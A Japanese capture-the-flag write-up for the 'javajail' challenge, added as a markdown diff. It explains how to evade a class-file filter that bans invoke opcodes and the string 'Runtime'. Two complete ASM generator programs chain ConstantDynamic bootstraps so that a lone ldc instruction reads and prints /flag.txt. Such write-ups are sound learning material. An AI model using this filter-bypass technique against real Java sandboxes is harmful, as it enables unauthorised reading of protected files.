@@ -1,0 +1,167 @@
+---
+title: "javajail"
+categories: ["misc"]
+solves: 55
+---
+# 問題
+渡したクラスファイルを読み込み、`run()` を実行してくれるサービスです。`/flag.txt`にあるフラグを読むことがゴールですが、以下の制約があります。
+
+- クラスサイズは 650 バイト以下
+- クラス内に `Runtime` という ASCII 文字列が含まれていてはいけない
+- `invokestatic` / `invokevirtual` / `invokespecial` / `invokeinterface` / `invokedynamic`を含んでいてはいけない
+
+# 解法
+フィルターがなければ `run` 関数内で `System.out.println(Files.readString(new File("/flag.txt").toPath()));` を呼ぶようなコードをコンパイルして渡せばよいです。
+しかし、JVM では`readString`や`println`といったメソッド呼び出しはバイトコード上では `invokestatic` 命令や `invokevirtual` 命令としてコンパイルされるため、`run()` 内でメソッドを呼ぶこと自体が不可能に見えます。
+
+これを回避するため、 `ConstantDynamic` を使います。これは `ldc` 命令で定数をロードするときに、`ConstantBootstraps` を介して任意の処理を実行し、その結果を定数として返せる仕組みです。
+つまり、 `run()` 内では `ldc` 命令を実行するだけでメソッド呼び出し相当の処理を発生させることができます。
+
+この方法で`System.out.println(Files.readString(new File("/flag.txt").toPath()));`を実行するクラスファイルを生成するコードは、例えば以下のようになります。
+
+<details>
+<summary>クラスファイルの生成コード（クリックで展開）</summary>
+```java
+import jdk.internal.org.objectweb.asm.*;
+import static jdk.internal.org.objectweb.asm.Opcodes.*;
+import java.util.Base64;
+
+public class Gen {
+    public static void main(String[] args) throws Exception {
+        ClassWriter cw = new ClassWriter(0);
+        cw.visit(V17, ACC_PUBLIC, "X", null, "java/lang/Object", null);
+
+        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "run", "()V", null, null);
+        mv.visitCode();
+
+        Handle bsmInvoke = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "invoke",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/invoke/MethodHandle;[Ljava/lang/Object;)Ljava/lang/Object;",
+            false
+        );
+
+        Handle bsmGetStaticFinal = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "getStaticFinal",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/Class;)Ljava/lang/Object;",
+            false
+        );
+        ConstantDynamic file = new ConstantDynamic(
+            "_",
+            "Ljava/io/File;",
+            bsmInvoke,
+            new Handle(H_NEWINVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false),
+            "/flag.txt"
+        );
+        ConstantDynamic path = new ConstantDynamic(
+            "_",
+            "Ljava/nio/file/Path;",
+            bsmInvoke,
+            new Handle(H_INVOKEVIRTUAL, "java/io/File", "toPath", "()Ljava/nio/file/Path;", false),
+            file
+        );
+        ConstantDynamic str = new ConstantDynamic(
+            "_",
+            "Ljava/lang/String;",
+            bsmInvoke,
+            new Handle(H_INVOKESTATIC, "java/nio/file/Files", "readString", "(Ljava/nio/file/Path;)Ljava/lang/String;", false),
+            path
+        );
+        ConstantDynamic out = new ConstantDynamic(
+            "_",
+            "Ljava/io/PrintStream;",
+            bsmGetStaticFinal,
+            new Object[]{ Type.getType("Ljava/lang/System;") }
+        );
+        ConstantDynamic print = new ConstantDynamic(
+            "_",
+            "Ljava/lang/Object;",
+            bsmInvoke,
+            new Object[]{
+                new Handle(H_INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false),
+                out,
+                str
+            }
+        );
+        mv.visitLdcInsn(print);
+        mv.visitInsn(POP);
+        mv.visitInsn(RETURN);
+        mv.visitMaxs(1, 0);
+        mv.visitEnd();
+
+        cw.visitEnd();
+        byte[] bytesOut = cw.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(bytesOut));
+    }
+}
+```
+</details>
+
+これを実行してみると、クラスファイルは 979 バイトとなり、残念ながら1つ目の条件である「クラスサイズは 650 バイト以下」を満たしません。
+この方法では `ConstantDynamic` を5つ使っていることが主なバイトサイズ増加の原因となっており、更に短いチェインで同様の処理を実行する方法を考える必要があります。
+
+いくつか方法はあると思いますが、 `new FileInputStream("flag.txt").transferTo(System.out)` という呼び出しが想定解となります。この形であれば、 `ConstantDynamic` を 3 つに抑えられます。
+以下のようにしてクラスファイルを生成できます。
+
+<details>
+<summary>クラスファイルの生成コード（クリックで展開）</summary>
+```java
+import jdk.internal.org.objectweb.asm.*;
+import static jdk.internal.org.objectweb.asm.Opcodes.*;
+import java.util.Base64;
+
+public class Gen {
+    public static void main(String[] args) throws Exception {
+        ClassWriter cw = new ClassWriter(0);
+        cw.visit(V17, ACC_PUBLIC, "X", null, "java/lang/Object", null);
+
+        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "run", "()V", null, null);
+        mv.visitCode();
+
+        Handle bsm = new Handle(
+            H_INVOKESTATIC,
+            "java/lang/invoke/ConstantBootstraps",
+            "invoke",
+            "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/Class;Ljava/lang/invoke/MethodHandle;[Ljava/lang/Object;)Ljava/lang/Object;",
+            false
+        );
+        ConstantDynamic fis = new ConstantDynamic(
+            "out",
+            "Ljava/io/FileInputStream;",
+            bsm,
+            new Handle(H_NEWINVOKESPECIAL, "java/io/FileInputStream", "<init>", "(Ljava/lang/String;)V", false),
+            "/flag.txt"
+        );
+        ConstantDynamic sysOut = new ConstantDynamic(
+            "out",
+            "Ljava/io/PrintStream;",
+            bsm,
+            new Handle(H_GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;", false)
+        );
+        ConstantDynamic transferred = new ConstantDynamic(
+            "out",
+            "J",
+            bsm,
+            new Handle(H_INVOKEVIRTUAL, "java/io/FileInputStream", "transferTo", "(Ljava/io/OutputStream;)J", false),
+            fis,
+            sysOut
+        );
+        mv.visitLdcInsn(transferred);
+        mv.visitInsn(POP2);
+        mv.visitInsn(RETURN);
+
+        mv.visitMaxs(2, 0);
+        mv.visitEnd();
+
+        cw.visitEnd();
+        byte[] classBytes = cw.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(classBytes));
+    }
+}
+```
+</details>
+
+バイト数は 634 バイトとなり、条件を満たすことができます。更に、クラスファイル内で参照される同じ文字列定数を使い回すなどの最適化により、617バイトまで削減できることを確認しています。更に削減できたら教えてください。
